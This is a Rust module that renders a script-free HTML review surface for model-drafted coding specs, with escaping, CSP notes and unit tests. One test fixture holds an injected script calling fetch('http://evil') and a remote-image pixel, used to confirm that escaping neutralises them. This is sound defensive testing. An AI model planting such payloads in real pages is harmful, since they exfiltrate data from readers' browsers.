//! The browser surface: server-rendered HTML, no script at all.
//!
//! **Forms, not fetch.** The CSP forbids script outright (`default-src 'none'`),
//! which is only possible because nothing here needs it. A page that needs script
//! needs a CSP that permits script, and permitting script is what makes a rendered
//! model-authored spec dangerous.
//!
//! It also makes the surface work on a phone with a bad connection on a train,
//! which is the situation this whole feature exists for.
//!
//! ## Everything model-authored is escaped
//!
//! A drafted spec is untrusted text: a model wrote it, and it may contain
//! anything. It is rendered as **escaped text in a `<pre>`**, never as Markdown
//! and never as HTML. That removes the whole class rather than filtering it — one
//! remote image reference in a rendered spec is an exfiltration path, and a
//! filter that has to be right every time eventually is not.

use sc_daemon::IntakeKind;

use crate::store::{Request, RequestState};

/// Escape for HTML text content and attributes.
///
/// Applied to **everything** that did not come from this file. There is no
/// "trusted" path: the request text was typed by a person on the internet and the
/// spec was written by a model.
pub fn esc(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            _ => out.push(c),
        }
    }
    out
}

/// The stylesheet. Inline, because the CSP allows no remote subresource and a
/// separate file would be one more request on a bad connection.
const STYLE: &str = "\
:root { color-scheme: light dark; }
* { box-sizing: border-box; }
body { font: 16px/1.55 system-ui, -apple-system, 'Segoe UI', sans-serif;
       margin: 0; padding: 1rem; max-width: 46rem; margin-inline: auto; }
h1 { font-size: 1.3rem; margin: 0 0 1rem; }
h2 { font-size: 1.05rem; margin: 1.5rem 0 .5rem; }
a { color: inherit; }
form { margin: 0; }
label { display: block; margin: .75rem 0 .25rem; font-weight: 600; font-size: .9rem; }
textarea, input, select, button {
  font: inherit; width: 100%; padding: .6rem; border-radius: .4rem;
  border: 1px solid rgba(128,128,128,.5); background: transparent; color: inherit; }
textarea { min-height: 7rem; resize: vertical; }
button { cursor: pointer; margin-top: .75rem; font-weight: 600; }
.row { display: flex; gap: .5rem; }
.row > form { flex: 1; }
.item { display: block; padding: .7rem; margin: .4rem 0; text-decoration: none;
        border: 1px solid rgba(128,128,128,.35); border-radius: .5rem; }
.meta { font-size: .8rem; opacity: .7; }
.tag { display: inline-block; font-size: .72rem; padding: .1rem .45rem;
       border-radius: .8rem; border: 1px solid currentColor; opacity: .85; }
pre { white-space: pre-wrap; word-wrap: break-word; padding: .8rem;
      border: 1px solid rgba(128,128,128,.35); border-radius: .5rem;
      font: 13px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace; }
.note { padding: .7rem; border-left: 3px solid currentColor; opacity: .85;
        font-size: .9rem; }
";

fn shell(title: &str, body: &str) -> String {
    format!(
        "<!doctype html>\n<html lang=\"en\"><head><meta charset=\"utf-8\">\
<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\
<title>{}</title><style>{STYLE}</style></head><body>{body}</body></html>",
        esc(title)
    )
}

/// The repositories offered in the form.
///
/// Rendered as a free-text *name* field rather than a fixed list, because the
/// server genuinely does not know which repositories a daemon serves — it holds no
/// configuration and no path. A name the daemon does not recognise is refused
/// there, which is where the closed set actually lives (spec 18).
fn repo_field() -> String {
    "<label for=\"repo\">Repository</label>\
     <input id=\"repo\" name=\"repo\" required autocapitalize=\"off\" \
     autocorrect=\"off\" spellcheck=\"false\" placeholder=\"the name your daemon uses\">"
        .to_string()
}

fn kind_field() -> String {
    // Driven by `IntakeKind::ALL`, so a kind added there appears here without
    // anyone remembering to update a second list.
    let mut opts = String::new();
    for k in IntakeKind::ALL {
        opts.push_str(&format!(
            "<option value=\"{slug}\">{slug}</option>",
            slug = esc(k.slug())
        ));
    }
    format!(
        "<label for=\"kind\">Kind</label>\
         <select id=\"kind\" name=\"kind\">{opts}</select>"
    )
}

/// The list, plus the form to file something new.
pub fn index(all: &[Request]) -> String {
    let ordered = crate::routes::listing_order(all.to_vec());
    let mut items = String::new();
    for r in &ordered {
        items.push_str(&format!(
            "<a class=\"item\" href=\"/request/{id}\">{summary}\
             <div class=\"meta\"><span class=\"tag\">{state}</span> \
             {repo} · {kind}</div></a>",
            id = esc(&r.id),
            summary = esc(r.summary()),
            state = esc(r.state.label()),
            repo = esc(&r.repo),
            kind = esc(r.kind.slug()),
        ));
    }
    if ordered.is_empty() {
        items.push_str("<p class=\"meta\">Nothing filed yet.</p>");
    }

    shell(
        "Smart Coder — requests",
        &format!(
            "<h1>Requests</h1>\
             <form method=\"post\" action=\"/file\">\
             <label for=\"text\">What needs doing?</label>\
             <textarea id=\"text\" name=\"text\" required \
             placeholder=\"Describe it the way you would to a colleague.\"></textarea>\
             {kind}{repo}\
             <button type=\"submit\">File it</button></form>\
             <h2>Filed</h2>{items}",
            kind = kind_field(),
            repo = repo_field(),
        ),
    )
}

/// Confirmation that a request was filed.
pub fn filed(r: &Request) -> String {
    let body = if r.kind == IntakeKind::Feedback {
        // Feedback deliberately drafts nothing: it is kept for the developer to
        // read, not turned into work nobody asked for.
        "<p>Thanks — that is recorded. Feedback is kept for the developer to read; \
         it does not become a spec.</p>"
            .to_string()
    } else {
        format!(
            "<p>Filed. A daemon will draft a spec for <strong>{}</strong> when it \
             next polls; come back and read it before it goes anywhere.</p>",
            esc(&r.repo)
        )
    };
    shell(
        "Filed",
        &format!("<h1>Filed</h1>{body}<p><a href=\"/\">Back to the list</a></p>"),
    )
}

/// One request, and its spec if there is one.
pub fn detail(r: &Request) -> String {
    let mut body = format!(
        "<h1>{summary}</h1>\
         <p class=\"meta\"><span class=\"tag\">{state}</span> {repo} · {kind}</p>\
         <h2>The request</h2><pre>{text}</pre>",
        summary = esc(r.summary()),
        state = esc(r.state.label()),
        repo = esc(&r.repo),
        kind = esc(r.kind.slug()),
        text = esc(&r.text),
    );

    if let Some(note) = &r.note {
        body.push_str(&format!("<p class=\"note\">{}</p>", esc(note)));
    }

    match (&r.spec, r.state) {
        (Some(spec), RequestState::AwaitingReview) => {
            body.push_str(&format!(
                "<h2>The drafted spec</h2><pre>{}</pre>{}",
                esc(spec),
                review_actions(&r.id)
            ));
        }
        (Some(spec), _) => {
            body.push_str(&format!("<h2>The spec</h2><pre>{}</pre>", esc(spec)));
            if let Some(dir) = &r.artifact_dir {
                body.push_str(&format!(
                    "<p class=\"meta\">In the repository at <code>{}</code>.</p>",
                    esc(dir)
                ));
            }
        }
        (None, RequestState::Queued) => {
            body.push_str("<p class=\"meta\">Waiting for a daemon to pick it up.</p>");
        }
        (None, RequestState::Claimed) => {
            body.push_str("<p class=\"meta\">Being drafted now.</p>");
        }
        _ => {}
    }

    if r.state == RequestState::Ready {
        // Saying so plainly, because "ready" could easily read as "built".
        body.push_str(
            "<p class=\"note\">Approved. The spec is settled in the repository — \
             nothing has been built. Pick it up in your IDE when you choose to.</p>",
        );
    }

    body.push_str("<p><a href=\"/\">Back to the list</a></p>");
    shell(r.summary(), &body)
}

/// Approve and send-back, as visually equal actions.
///
/// Spec 20: a phone UI whose easiest action is a big green button, on an artifact
/// too long to read on that screen, produces rubber-stamp approval — and a
/// rubber-stamped gate is worse than no gate, because the system still reports that
/// a human signed off. So send-back carries the same weight, and deferring (simply
/// leaving the page) costs nothing at all.
fn review_actions(id: &str) -> String {
    let id = esc(id);
    format!(
        "<h2>Your call</h2>\
         <form method=\"post\" action=\"/request/{id}/send-back\">\
         <label for=\"notes\">Send it back — what should change?</label>\
         <textarea id=\"notes\" name=\"notes\" required \
         placeholder=\"The redraft grounds on this, so be specific.\"></textarea>\
         <button type=\"submit\">Send back</button></form>\
         <form method=\"post\" action=\"/request/{id}/approve\">\
         <button type=\"submit\">Approve this spec</button></form>\
         <form method=\"post\" action=\"/request/{id}/discard\">\
         <button type=\"submit\">Discard</button></form>\
         <p class=\"meta\">Leaving this page decides nothing — it will still be \
         here.</p>"
    )
}

/// The enrolment page, shown to a browser that is not enrolled.
pub fn enrol_page() -> String {
    shell(
        "Enrol this device",
        "<h1>Enrol this device</h1>\
         <p>Read the enrolment code from the server's startup log and \
         type it here.</p>\
         <form method=\"post\" action=\"/enrol\">\
         <label for=\"code\">Enrolment code</label>\
         <input id=\"code\" name=\"code\" required autocapitalize=\"characters\" \
         autocorrect=\"off\" spellcheck=\"false\" placeholder=\"XXX-XXX\">\
         <label for=\"label\">What is this device?</label>\
         <input id=\"label\" name=\"label\" placeholder=\"phone\">\
         <button type=\"submit\">Enrol</button></form>\
         <p class=\"meta\">The code works once. Each device gets its own \
         credential, so losing one does not mean losing the others.</p>",
    )
}

/// The same page, after a failed attempt.
///
/// The message is deliberately identical whatever went wrong — wrong code, no code
/// armed, already spent. Distinguishing them tells a guesser which half they got
/// right.
pub fn enrol_page_with_error() -> String {
    enrol_page().replace(
        "<h1>Enrol this device</h1>",
        "<h1>Enrol this device</h1>\
         <p class=\"note\">That code did not work. Generate a fresh one and try \
         again.</p>",
    )
}

/// Shown once a device is enrolled.
pub fn enrolled_page() -> String {
    shell(
        "Enrolled",
        "<h1>Enrolled</h1>\
         <p>This device is enrolled. <a href=\"/\">Go to the requests</a>.</p>",
    )
}

/// A plain message page, for a refused action.
pub fn message(msg: &str) -> String {
    shell(
        "Smart Coder",
        &format!(
            "<p class=\"note\">{}</p><p><a href=\"/\">Back to the list</a></p>",
            esc(msg)
        ),
    )
}

pub fn not_found() -> String {
    shell(
        "Not found",
        "<h1>Not found</h1><p><a href=\"/\">Back to the list</a></p>",
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn req(text: &str) -> Request {
        Request::new("r-1", text, "alpha", IntakeKind::Feature)
    }

    #[test]
    fn a_page_references_nothing_remote() {
        // The CSP forbids remote subresources; a page that needed one would be a
        // page that does not render, which is worse than one that never asks.
        let pages = [
            index(&[req("a thing")]),
            detail(&req("a thing")),
            enrol_page(),
            enrolled_page(),
            not_found(),
            message("nope"),
        ];
        for p in pages {
            assert!(!p.contains("http://"), "{p}");
            assert!(!p.contains("https://"), "{p}");
            assert!(!p.contains("<script"), "{p}");
            assert!(!p.contains("<img"), "{p}");
            assert!(!p.contains("<link"), "{p}");
        }
    }

    #[test]
    fn a_drafted_spec_is_escaped_rather_than_rendered() {
        // A model wrote it and it may contain anything. Escaping removes the
        // whole class; a filter that has to be right every time eventually is not.
        let mut r = req("a thing");
        r.state = RequestState::AwaitingReview;
        r.spec = Some(
            "# Spec\n<script>fetch('http://evil')</script>\n![x](http://evil/pixel)".to_string(),
        );

        let html = detail(&r);
        assert!(!html.contains("<script>"), "{html}");
        assert!(html.contains("&lt;script&gt;"), "{html}");
        // The Markdown image is inert text, not a request.
        assert!(!html.contains("<img"), "{html}");
    }

    #[test]
    fn a_request_typed_by_a_person_is_escaped_too() {
        // There is no trusted path: the text came off the public internet.
        let r = req("<b>bold</b> & \"quoted\"");
        let html = detail(&r);
        assert!(html.contains("&lt;b&gt;"), "{html}");
        assert!(!html.contains("<b>bold</b>"), "{html}");
    }

    #[test]
    fn escaping_covers_every_character_that_matters() {
        assert_eq!(esc("<&>\"'"), "&lt;&amp;&gt;&quot;&#39;");
        // Ampersand first, or the escapes escape each other.
        assert_eq!(esc("&lt;"), "&amp;lt;");
    }

    #[test]
    fn approve_and_send_back_carry_the_same_weight() {
        // Spec 20: a rubber-stamped gate is worse than no gate, because the
        // system still reports that a human signed off. Neither action may be
        // the visually easy one.
        let mut r = req("a thing");
        r.state = RequestState::AwaitingReview;
        r.spec = Some("# Spec".to_string());
        let actions = review_actions("r-1");
        assert!(actions.contains("/request/r-1/approve"), "{actions}");
        assert!(actions.contains("/request/r-1/send-back"), "{actions}");

        // Every button is bare: no class, no inline style, so none is the one a
        // thumb lands on. Asserted over the buttons themselves — over the whole
        // page the shared stylesheet would make this pass for the wrong reason.
        let buttons: Vec<&str> = actions
            .match_indices("<button")
            .map(|(i, _)| &actions[i..])
            .collect();
        assert_eq!(buttons.len(), 3, "send back, approve, discard");
        for b in buttons {
            let tag = &b[..b.find('>').unwrap()];
            assert_eq!(tag, "<button type=\"submit\"", "styled differently: {tag}");
        }
        // Send-back comes first, so the effortful choice is the one in reach.
        let send_back = actions.find("send-back").unwrap();
        let approve = actions.find("approve").unwrap();
        assert!(send_back < approve, "{actions}");

        // And deferring is free, and says so.
        assert!(detail(&r).contains("decides nothing"));
    }

    #[test]
    fn a_send_back_demands_a_reason_in_the_form_itself() {
        // Without one the redraft has nothing to go on and produces the same
        // spec, which reads to the developer as being ignored.
        let mut r = req("a thing");
        r.state = RequestState::AwaitingReview;
        r.spec = Some("# Spec".to_string());
        let html = detail(&r);
        assert!(html.contains("name=\"notes\" required"), "{html}");
    }

    #[test]
    fn review_actions_appear_only_when_there_is_something_to_review() {
        // Approving a queued request would be signing off a spec that does not
        // exist.
        let r = req("a thing");
        let html = detail(&r);
        assert!(!html.contains("/approve"), "{html}");
        assert!(html.contains("Waiting for a daemon"), "{html}");
    }

    #[test]
    fn ready_says_plainly_that_nothing_was_built() {
        // "Ready" reads as "built" unless the page says otherwise.
        let mut r = req("a thing");
        r.state = RequestState::Ready;
        r.spec = Some("# Spec".to_string());
        r.artifact_dir = Some("specs/a-thing".to_string());
        let html = detail(&r);
        assert!(html.contains("nothing has been built"), "{html}");
        assert!(html.contains("specs/a-thing"), "{html}");
    }

    #[test]
    fn feedback_says_it_becomes_no_spec() {
        // The user's rule: feedback is saved, not turned into work nobody asked
        // for. The person filing it should know that before they walk away.
        let r = Request::new(
            "r-1",
            "the buttons are small",
            "alpha",
            IntakeKind::Feedback,
        );
        let html = filed(&r);
        assert!(html.contains("does not become a spec"), "{html}");
    }

    #[test]
    fn the_form_offers_all_four_kinds() {
        let html = index(&[]);
        for kind in ["bug", "feature", "improvement", "feedback"] {
            assert!(
                html.contains(&format!("value=\"{kind}\"")),
                "{kind}: {html}"
            );
        }
    }

    #[test]
    fn the_form_asks_for_a_repository_name_and_offers_no_path_field() {
        // Traversal is unreachable because there is nowhere to type a path.
        let html = index(&[]);
        assert!(html.contains("name=\"repo\""), "{html}");
        for path_ish in ["name=\"path\"", "name=\"dir\"", "name=\"workspace\""] {
            assert!(!html.contains(path_ish), "{path_ish}: {html}");
        }
    }

    #[test]
    fn the_list_puts_what_needs_a_human_at_the_top() {
        let mut waiting = Request::new("r-2", "second", "beta", IntakeKind::Bug);
        waiting.state = RequestState::AwaitingReview;
        let html = index(&[req("first"), waiting]);
        let awaiting = html.find("r-2").unwrap();
        let queued = html.find("r-1").unwrap();
        assert!(awaiting < queued, "the one awaiting review comes first");
    }

    #[test]
    fn an_empty_list_says_so_rather_than_showing_nothing() {
        assert!(index(&[]).contains("Nothing filed yet"));
    }

    #[test]
    fn the_page_works_on_a_phone() {
        // The situation this whole feature exists for: a phone, on a train, on a
        // bad connection.
        let html = index(&[]);
        assert!(html.contains("width=device-width"), "{html}");
        // No script and no remote assets, so it renders on the first round trip.
        assert!(!html.contains("<script"), "{html}");
    }

    #[test]
    fn the_enrolment_page_names_only_a_way_in_that_exists() {
        // It told the developer to run `smart-coder enrol`, which no crate
        // implements — a page confidently instructing someone to run a command
        // that does not exist is worse than one that says nothing.
        let html = enrol_page();
        assert!(html.contains("startup log"), "{html}");
        assert!(
            !html.contains("smart-coder enrol"),
            "no such subcommand exists yet: {html}"
        );
    }

    #[test]
    fn a_failed_enrolment_reveals_nothing_about_why() {
        let html = enrol_page_with_error();
        assert!(html.contains("did not work"), "{html}");
        for leak in ["expired", "already used", "no code", "wrong code"] {
            assert!(!html.contains(leak), "{leak} leaks which half was right");
        }
    }
}
